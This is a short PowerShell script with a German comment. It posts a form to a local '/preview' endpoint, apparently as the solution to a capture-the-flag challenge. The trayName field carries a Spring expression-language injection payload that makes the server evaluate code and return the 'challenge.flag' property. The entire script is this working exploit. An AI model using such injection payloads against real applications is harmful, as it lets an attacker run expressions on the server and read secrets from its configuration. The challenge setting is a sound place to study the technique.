# Führt die Web-Anfrage aus, ohne dass die PowerShell versucht, den String zu manipulieren
$response = Invoke-WebRequest -Uri "http://localhost:3000/preview" `
                              -Method Post `
                              -Body @{ trayName = '${@environment.getProperty("challenge.flag")}' }

Write-Output $response.Content